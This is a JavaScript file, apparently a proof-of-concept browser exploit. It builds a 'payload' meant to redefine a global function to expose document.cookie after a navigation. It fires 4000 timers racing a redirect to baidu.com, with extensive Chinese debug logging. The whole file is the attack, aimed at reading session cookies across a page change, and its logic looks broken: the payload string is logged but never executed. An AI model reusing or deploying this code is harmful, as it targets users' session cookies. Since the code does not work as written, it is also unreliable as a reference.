(function() {
    'use strict';
    
    console.log('📦 shared-functions.js 开始加载...');
    console.log('🕒 加载时间:', new Date().toISOString());
    console.log('🌐 当前域名:', window.location.hostname);
    
    // 定义 backToSrcLanguage 函数
    window.backToSrcLanguage = function() {
        console.log('🚀 backToSrcLanguage 函数被调用');
        console.log('📝 调用堆栈:', new Error().stack);
        
        const currUrl = location.href;
        console.log('📍 当前URL:', currUrl);
        
        const payload = `
        if (!location.href.startsWith("${currUrl}") && !window.__cloudx_called) {
            window.__cloudx_called = true;
            console.log('开始重定义backToSrcLanguage方法');
            window.backToSrcLanguage = function() {alert(document.cookie);}
            console.log('重定义backToSrcLanguage完成');
        }
        `;
        
        console.log('📄 生成的payload:', payload);
        console.log('🔁 开始设置4000个定时器...');
        
        for (let i = 0; i < 4000; i++) {
            setTimeout(function() {
                console.log(`⏰ 定时器 #${i} 执行`);
                console.log(`🔍 检查 window.__cloudx_called:`, window.__cloudx_called);
                
                window.backToSrcLanguage();
                
            }, i);
        }
        
        console.log('✅ 4000个定时器设置完成');
        console.log('🔗 准备跳转到百度...');
        
        // 跳转到百度
        window.location.href = "https://www.baidu.com";
        
        console.log('🔄 跳转指令已执行');
        
        return true;
    };
    
    // 添加函数属性用于调试
    window.backToSrcLanguage.debugInfo = {
        version: '1.0.0',
        loadedAt: new Date().toISOString(),
        hasPayload: true,
        timerCount: 4000
    };
    
    console.log('✅ backToSrcLanguage 函数已定义');
    console.log('📊 函数信息:', window.backToSrcLanguage.debugInfo);
    console.log('🔒 函数定义完成时间:', new Date().toISOString());
    
    // 添加全局标记
    window.__cloudx_loaded = true;
    window.__cloudx_load_time = Date.now();
    
    console.log('🏷️ 全局标记已设置:');
    console.log('  - window.__cloudx_loaded:', window.__cloudx_loaded);
    console.log('  - window.__cloudx_load_time:', window.__cloudx_load_time);
    console.log('  - window.__cloudx_called:', window.__cloudx_called);
    
    // 记录原始函数引用（用于调试）
    window.__original_backToSrcLanguage = window.backToSrcLanguage;
    console.log('💾 原始函数引用已保存');
    
})();

// 页面加载后自动记录
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
        console.log('📄 DOM加载完成');
        console.log('🍪 当前cookie长度:', document.cookie.length);
    });
}

window.addEventListener('load', function() {
    console.log('🖼️ 页面完全加载完成');
    console.log('🔗 当前完整URL:', window.location.href);
    console.log('🧩 readyState:', document.readyState);
});

// 监听页面跳转
window.addEventListener('beforeunload', function(e) {
    console.log('⚠️ 页面即将卸载/跳转');
    console.log('🎯 目标URL:', e.currentTarget.location.href);
    console.log('🔄 跳转时间:', new Date().toISOString());
});

// 错误捕获
window.addEventListener('error', function(e) {
    console.error('❌ 全局错误捕获:', e.message);
    console.error('📄 错误文件:', e.filename);
    console.error('📍 错误行号:', e.lineno);
    console.error('📍 错误列号:', e.colno);
    console.error('🔍 错误对象:', e.error);
});

console.log('🎉 shared-functions.js 加载脚本执行完毕');
console.log('=========================================');
